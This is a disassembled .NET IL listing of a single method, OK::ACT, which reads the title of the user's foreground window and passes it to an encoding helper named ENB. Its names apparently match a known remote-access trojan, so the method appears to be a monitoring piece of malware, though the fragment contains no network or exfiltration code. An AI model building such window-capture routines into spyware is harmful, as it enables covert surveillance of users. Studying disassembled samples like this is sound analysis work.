  .method public static string  ACT() cil managed
  {
    // Code size       93 (0x5d)
    .maxstack  3
    .locals init (string V_0,
             native int V_1,
             string V_2,
             class [mscorlib]System.Exception V_3)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_005b

      IL_001b:  ldloc.1
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.2
      IL_002e:  ldloc.1
      IL_002f:  ldloca.s   V_2
      IL_0031:  ldloc.2
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                                 string&,
                                                                 int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_2
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.0
      IL_0045:  leave.s    IL_005b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.3
      IL_004e:  ldstr      ""
      IL_0053:  stloc.0
      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  leave.s    IL_005b

    }  // end handler
    IL_005b:  ldloc.0
    IL_005c:  ret
  } // end of method OK::ACT
